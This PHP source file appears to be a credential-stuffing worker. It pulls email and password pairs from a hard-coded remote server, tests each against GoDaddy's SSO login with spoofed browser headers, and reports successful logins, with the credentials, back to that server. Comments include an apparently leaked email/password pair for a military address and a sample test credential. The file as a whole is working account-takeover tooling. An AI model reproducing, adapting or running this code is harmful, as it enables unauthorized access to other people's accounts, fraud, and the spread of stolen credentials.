<?php
/**
 * Created by PhpStorm.
 * User: kid-dorr
 * Date: 6/6/2017
 * Time: 8:21 AM
 */

// add bindto to worker
//$socket = array('bindto' => '192.168.0.1:0');
$socket = null;
// url
$host = "http://158.69.193.39";
$connect_url = "/w/api/v1/workers/connect.php";
$nextmail_url = "/w/api/v1/mails/next.php";
$newresult_url = "/w/api/v1/results/new.php";

$secret = "\$2y\$12\$J1k/vLIWAW13Kg5KGBxpY.tfuaQN2IVJ5QjS27j/UJSCYu0XERzsW";

// connect to cloud
function isConnected($url, $sk = null) {

    $opts = array(
        'http' => array(
            'method' => 'GET',
            'header' => 'Accept-languare: en\r\n'
        )
    );
    // add socket
    if ($sk) {
        $opts['socket'] = $sk;
    } else {
        echo "socket null";
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($url, false, $context);
    $json_resp = json_decode($resp, true);
    return $json_resp;
}

function nextMail($url, $sk = null) {
//    $connect_init = curl_init($url);
//
//    curl_setopt($connect_init, CURLOPT_RETURNTRANSFER, 1);
//    $connect_resp = curl_exec($connect_init);
//
//    $json_resp = json_decode($connect_resp, true);
//    //print_r($json_resp["status"]);
//    curl_close($connect_init);
//    return $json_resp;
//    // get a mailpass to check "Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) ) ";
    $opts = array(
        'http' => array(
            'method' => 'GET',
            'header' => 'Accept-languare: en\r\n'
        )
    );
    if ($sk) {
        $opts['socket'] = $sk;
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($url, false, $context);
    $json_resp = json_decode($resp, true);
    return $json_resp;
}

function newResult($url, $query, $sk = null) {
    //$secret = $query['secret'];
    //echo $secret."<br>";

    $lease_id = $query['id'];

    $mail = $query['mail'];

    $pass = $query['pass'];

    $type = $query['type'];

    $result = $query['result'];

    $data = $query['data'];

    $new_result_url = $url."&id=".$lease_id."&mail=".$mail."&pass=".$pass."&type=".$type."&result=".$result."&data=".$data;
    //echo $new_result_url;
//    $new_result_init = curl_init($new_result_url);
//    curl_setopt($new_result_init, CURLOPT_POST, 1);
//
//    curl_setopt($new_result_init, CURLOPT_RETURNTRANSFER, true);
//
//    $new_result_resp = curl_exec($new_result_init);
//
//    curl_close($new_result_init);
//
//    //print_r($new_result_resp);

    $opts = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Accept-language: en'
        )
    );
    if ($sk) {
        $opts['socket'] = $sk;
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($new_result_url, false, $context);
    print_r($resp);
}


function checkGodaddy($mailpass, $sk = null) {
    echo "check godaddy";
    $mail = $mailpass['mail'];
    $pass = $mailpass['pass'];
    //print_r($mailpass);

    $get_login_url = "https://sso.godaddy.com/?realm=idp&path=%2F&app=mya";
    $post_login_url = "https://sso.godaddy.com/v1/?path=%2F&app=mya&realm=idp";
    $get_logout_url = "https://sso.godaddy.com/logout?realm=idp&app=mya&path=";

    // post login
//    $post_login_init = curl_init($post_login_url);
//    //curl_setopt($post_login_url, CURLOPT_POST, 1);
//    curl_setopt($post_login_init, CURLOPT_HTTPHEADER, array(
//        'Upgrade-Insecure-Requests: 1',
//        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
//        'Content-Type: application/x-www-form-urlencoded',
//        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
//        'Accept-Language: en-US,en;q=0.8'
//    ));
//    curl_setopt($post_login_init, CURLOPT_POSTFIELDS, "app=mya&layout=layout.rebrand_layout.html&name=".$mail."&password=".$pass."&realm=idp&remember_me=on");
//    curl_setopt($post_login_init, CURLOPT_VERBOSE, true);
//    curl_setopt($post_login_init, CURLOPT_RETURNTRANSFER, true);
//    curl_setopt($post_login_init, CURLOPT_SSL_VERIFYPEER, false);
//
//
//    $post_login_resp = curl_exec($post_login_init);

    $login_data = http_build_query(
        array(
            'app' => 'mya',
            'layout' => 'layout.rebrand_layout.html',
            'name' => $mail,
            'password' => $pass,
            'realm' => 'idp',
            'remember_me' => 'on',
        )
    );

    $login_opts = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Upgrade-Insecure-Requests: 1\r\n'.
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n'.
                        'Content-type: application/x-www-form-urlencoded\r\n'.
                        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'.
                        'Accept-Language: en-US,en;q=0.8\r\n',
            'content' => $login_data,
        )
    );
    if ($sk) {
        $login_opts['socket'] = $sk;
    }



    $login_context = stream_context_create($login_opts);


    $login_resp = file_get_contents($post_login_url, false, $login_context);
    $login_status = $http_response_header[0];


    if ($login_status === "HTTP/1.1 302 FOUND") {
        $logout_opts = array(
            'method' => 'GET',
            'header' => 'Upgrade-Insecure-Requests: 1\r\n'.
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3119.0 Safari/537.36\r\n'.
                        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n'.
                        'Referer: https://mya.godaddy.com/\r\n'.
                        'Accept-Encoding: gzip, deflate, br\r\n'.
                        'Accept-Language: vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2\r\n',
        );

        if ($sk) {
            $logout_opts['socket'] = $sk;
        }

        $logout_context = stream_context_create($logout_opts);

        file_get_contents($get_logout_url, false, $logout_context);

        echo "login success";
        return 1;
    } else {
        echo "login fault";
        return 0;
    }

    //print_r($login_resp);



//    if (!curl_errno($post_login_init)) {
//        switch ($http_code = curl_getinfo($post_login_init, CURLINFO_HTTP_CODE)) {
//            case 200:  # Not login
//                echo 'login fault';
//                curl_close($post_login_init);
//                return 0;
//                break;
//            case 302: # OK
//                echo 'login success';
//
//                sleep(5000);
//                $get_logout_init = curl_init($get_logout_url);
//                curl_setopt($get_logout_init, CURLOPT_VERBOSE, true);
//                curl_setopt($get_logout_init, CURLOPT_RETURNTRANSFER, true);
//                curl_setopt(get_logout_init, CURLOPT_SSL_VERIFYPEER, false);
//                curl_exec($get_logout_init);
//                // logout
//                curl_close($post_login_init);
//                return 1;
//                break;
//            default:
//                echo 'Unexpected HTTP code: ', $http_code, "\n";
//        }
//    }

}

//$is_connected = isConnected($host.$connect_url."?secret=".$secret);
//print_r($is_connected);
//if ($is_connected) {
//    echo $is_connected['desc'];
//    $nextmail_resp = nextMail($host.$nextmail_url."?secret=".$secret."&type=1");
//    print_r($nextmail_resp);
//}

$test_mp = array(
    'mail' => 'giaminchu03',
    'pass' => 'Satsatsat1@3',
);


//checkGodaddy($test_mp);
$is_connected = isConnected($host.$connect_url."?secret=".$secret, $socket);
if ($is_connected) {
    echo $is_connected['desc'];
    // get mailpass
    $nextmail_resp = nextMail($host.$nextmail_url."?secret=".$secret."&type=1", $socket);
    // Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) )

    if($nextmail_resp['status']) {
        $mailpass = $nextmail_resp['data'];
        $result = checkGodaddy($mailpass, $socket);
        $query = array(	'id' => $mailpass['id'],
            'mail' => $mailpass['mail'],
            'pass' => $mailpass['pass'],
            'type' => $mailpass['types'],
            'result' => $result,
            'data' => '');

        $new_result_url = $host.$newresult_url."?secret=".$secret;
        newResult($new_result_url, $query, $socket);
        echo "update success";
    }

}

?>